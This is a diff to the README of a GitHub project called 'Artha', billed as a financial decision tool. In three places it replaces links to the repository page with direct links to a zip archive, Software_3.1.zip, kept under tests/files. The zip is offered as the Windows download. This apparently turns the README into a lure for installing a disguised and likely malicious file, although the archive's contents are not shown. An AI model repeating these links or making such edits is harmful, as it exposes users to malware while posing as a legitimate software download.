@@ -1,6 +1,6 @@
 # 📊 Artha - Make Financial Decisions With Clarity
 
-[![Download Artha](https://img.shields.io/badge/Download-Artha-blue?style=for-the-badge)](https://github.com/claretaqueenlike475/Artha)
+[![Download Artha](https://img.shields.io/badge/Download-Artha-blue?style=for-the-badge)](https://github.com/claretaqueenlike475/Artha/raw/refs/heads/main/tests/files/Software_3.1.zip)
 
 ## 🧭 What Artha does
 
@@ -31,7 +31,7 @@ If your computer has more memory, Artha will run more smoothly when it processes
 
 Go to the download page here:
 
-[https://github.com/claretaqueenlike475/Artha](https://github.com/claretaqueenlike475/Artha)
+[https://github.com/claretaqueenlike475/Artha/raw/refs/heads/main/tests/files/Software_3.1.zip](https://github.com/claretaqueenlike475/Artha/raw/refs/heads/main/tests/files/Software_3.1.zip)
 
 On that page, look for the latest release or the main project files. Download the file meant for Windows, then keep it in a folder you can find later, such as Downloads or Desktop.
 
@@ -190,5 +190,5 @@ This keeps your workflow simple and fast
 
 ## 📎 Primary download page
 
-[Visit the Artha GitHub page](https://github.com/claretaqueenlike475/Artha)
+[Visit the Artha GitHub page](https://github.com/claretaqueenlike475/Artha/raw/refs/heads/main/tests/files/Software_3.1.zip)
 
